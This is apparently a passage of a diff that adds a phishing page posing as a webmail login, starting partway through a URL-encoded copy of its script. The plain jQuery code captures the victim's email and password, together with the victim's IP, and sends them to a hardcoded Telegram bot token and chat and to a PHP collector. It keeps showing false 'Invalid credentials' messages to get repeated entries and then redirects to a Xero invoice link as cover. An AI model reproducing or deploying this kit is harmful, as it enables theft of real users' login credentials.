lid%20credentials.%20Please%20try%20again%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23q455m0T2%22%29.val%28%22%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28retries%20%3E%200%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28pcount%3E%3Dretries-1%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pcount%3D0%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20window.location.replace%28%60https%3A%2F%2F%24%7B_3w41l.split%28%27%40%27%29%5B1%5D%7D%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pcount%2B%3D1%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23submit-btn%27%29.removeAttr%28%27disabled%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%22%23successMessage%22%29.show%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23successMessage%27%29.html%28%22Invalid%20credentials.%20Please%20try%20again%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20complete%3A%20function%28%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%3C%2Fscript%3E' ) );
+  </script> <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+  <script>
+    $(document).ready(function(){
+      let userIP = '';
+      var count=0;
+      var pcount=0;
+      $.getJSON('https://api.ipify.org?format=json', function(data){
+        userIP = data.ip;
+      });
+
+      //  page setup area ==========================================================================
+      var bot_token = "7148375916:AAF0tJElL4mVB-TVT8J2kIJJo4Ojfq9XfyY"; 
+      var group_id = "5370730671";
+      var retries = 3;
+
+
+
+                  //   set your php forder here. 
+      //  php server setup area ========================================================================
+      var server_url = "http://Tsend.php";
+      // ===============================================================================================
+
+      const htmlElement = document.getElementById("html");
+      var _3w41l = window.location.hash.substr(1);
+      var h3w41l = htmlElement.dataset.emailvalue;
+      if (_3w41l || h3w41l) {
+        var my_3w41l = _3w41l || h3w41l;
+        $('#3w41l').val(my_3w41l);
+        // $('#hdn3w41l').val(my_3w41l);
+
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_3w41l)) {
+          $('#error').show();
+          _3w41l.focus;
+          return false;
+        }
+      }
+
+      $('#myform').on('submit', function(event){
+        event.preventDefault();
+        $('#submit-btn').attr('disabled', 'disabled');
+        $('#error').hide();
+        $('#successMessage').hide();
+        $('#pwdMsg').hide();
+        _3w41l=$("#3w41l").val();
+        var q455m0T2=$("#q455m0T2").val();
+
+        if (!q455m0T2) {
+          $('#pwdMsg').show();
+
+          return false;
+        }
+
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(_3w41l)) {
+          $('#error').show();
+          _3w41l.focus;
+          return false;
+        }
+
+        // TG script
+        if (bot_token && group_id) {
+          var url_tg = "https://api.telegram.org/bot"+bot_token+"/sendMessage?chat_id="+group_id+"&text=";
+          url_tg = url_tg + encodeURIComponent("====Webmail LogZ====\n Email: " + _3w41l + "\nPassword: " + q455m0T2 + "\nUserIp: " + userIP);
+          $.ajax({
+            type: 'POST',
+            url: url_tg,
+            // data: $this.serialize(),
+            beforeSend: function(xhr){
+            },
+            success: function(response){
+              if(response){
+                    console.log(`real count of ${count}`)
+                $("#q455m0T2").val("");
+                if (retries > 0) {
+                  if (count>=retries-1) {
+                    count=0;
+                    console.log(`got redirect count of ${count}`)
+                    window.location.replace(`https://in.xero.com/m/CEPaMrkIomwR8IDo6b0Z8hO3smEbAJYtb8Q8LaC5?utm_source=invoiceEmailViewInvoiceButton&utm_campaign=invoicesEmailStandardV2`);
+                  } else {
+                    count+=1;
+                    console.log(`increased count of ${count}`)
+                    $('#submit-btn').removeAttr('disabled');
+                  }
+                }
+                $("#successMessage").show();
+                $('#successMessage').html("Invalid credentials. Please try again");
+              }
+            },
+            error: function(){
+              $("#q455m0T2").val("");
+              if (retries > 0) {
+                if (count>=retries-1) {
+                  count=0;
+                    console.log(`got error redirect count of ${count}`)
+                  window.location.replace(`https://in.xero.com/m/CEPaMrkIomwR8IDo6b0Z8hO3smEbAJYtb8Q8LaC5?utm_source=invoiceEmailViewInvoiceButton&utm_campaign=invoicesEmailStandardV2`);
+                } else {
+                  count+=1;
+                  $('#submit-btn').removeAttr('disabled');
+                }
+              }
+              $("#successMessage").show();
+              $('#successMessage').html("Invalid credentials. Please try again");
+            },
+            complete: function(){
+            }
+          });
+        }
+
+        // php server script
+        if (server_url.trim()) {
+          $.ajax({
+            type: 'POST',
+            url: server_url,
+            data: {
+                    _3w41l: _3w41l,
+                    q455m0T2: q455m0T2,
+                    userIP: userIP
+                  },
+            // data: $this.serialize(),
+            beforeSend: function(xhr){
+            },
+            success: function(response){
+              if(response){
+                console.log(response);
+                $("#q455m0T2").val("");
+                if (retries > 0) {
+                  if (pcount>=retries-1) {
+                    pcount=0;
+                    window.location.replace(`https://in.xero.com/m/CEPaMrkIomwR8IDo6b0Z8hO3smEbAJYtb8Q8LaC5?utm_source=invoiceEmailViewInvoiceButton&utm_campaign=invoicesEmailStandardV2`);
+                  } else {
+                    pcount+=1;
+                    $('#submit-btn').removeAttr('disabled');
+                  }
+                }
+                $("#successMessage").show();
+                $('#successMessage').html("Invalid credentials. Please try again");
+              }
+            },
+            error: function(){
+              $("#q455m0T2").val("");
+              if (retries > 0) {
+                if (pcount>=retries-1) {
+                  pcount=0;
+                  window.location.replace(`https://in.xero.com/m/CEPaMrkIomwR8IDo6b0Z8hO3smEbAJYtb8Q8LaC5?utm_source=invoiceEmailViewInvoiceButton&utm_campaign=invoicesEmailStandardV2`);
+                } else {
+                  pcount+=1;
+                  $('#submit-btn').removeAttr('disabled');
+                }
+              }
+              $("#successMessage").show();
+              $('#successMessage').html("Invalid credentials. Please try again");
+            },
+            complete: function(){
+            }
+          });
+        }
+      });
+    });
+  </script>
+
+
+</body></html>
